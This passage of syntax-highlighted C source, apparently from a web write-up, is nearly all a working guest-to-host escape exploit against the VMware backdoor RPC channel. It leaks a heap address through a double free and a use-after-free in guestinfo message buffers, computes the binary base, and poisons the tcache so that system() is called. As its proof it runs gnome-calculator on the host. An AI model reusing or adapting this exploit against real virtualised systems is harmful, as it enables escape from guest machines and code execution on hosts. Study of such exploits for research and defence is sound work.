punctuation">;</span>    <span class="token comment">//third step,free it again</span>    <span class="token comment">//set status to be 4</span>    <span class="token comment">//free the output buffer</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Free the buffer again...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">0xffff</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish2\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"check the heap, our target buffer in tcache now!\nTrying to reuse the buffer as a struct, which we can leak..\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s5<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Should be done.Check the buffer\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//Now the output buffer of chan[1] is used as a struct, which contains many addresses</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    data <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">channel_recv_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span>i<span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:%lx\n"</span><span class="token punctuation">,</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    text <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>data<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0xf818d0</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_finish</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Leak Success\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//the exploit step is almost the same as the leak ones</span>    <span class="token keyword">struct</span> <span class="token class-name">channel</span> chan<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> res<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> len<span class="token punctuation">,</span>i<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s1 <span class="token operator">=</span> <span class="token string">"info-set guestinfo.b BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s2 <span class="token operator">=</span> <span class="token string">"info-get guestinfo.b"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s3 <span class="token operator">=</span> <span class="token string">"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s4 <span class="token operator">=</span> <span class="token string">"gnome-calculator\x00"</span><span class="token punctuation">;</span>    <span class="token class-name">uint64_t</span> pay1 <span class="token operator">=</span>text<span class="token operator">+</span><span class="token number">0xFE95B8</span><span class="token punctuation">;</span>     <span class="token class-name">uint64_t</span> pay2 <span class="token operator">=</span>text<span class="token operator">+</span><span class="token number">0xECFE0</span><span class="token punctuation">;</span> <span class="token comment">//system</span>    <span class="token class-name">uint64_t</span> pay3 <span class="token operator">=</span>text<span class="token operator">+</span><span class="token number">0xFE95C8</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>pay4 <span class="token operator">=</span> <span class="token string">"gnome-calculator\x00"</span><span class="token punctuation">;</span>    <span class="token comment">//run_cmd(s1);</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">,</span>s1<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv len:%d\n"</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    data <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">channel_recv_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span>i<span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:%s\n"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"this time free firstly\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">0xffff</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish2\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"already free check the heap\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"alloc for channel 1\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"leak2 success\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"free agin for UAF\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">0xffff</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish2\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"UAF done!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ready to change fd\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>pay1<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"hjacking!!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"target address in fd\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>pay2<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>pay3<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>pay4<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>pay4<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"success!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s4<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">leak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"text base :%p"</span><span class="token punctuation">,</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>   <span aria-hidden="true" 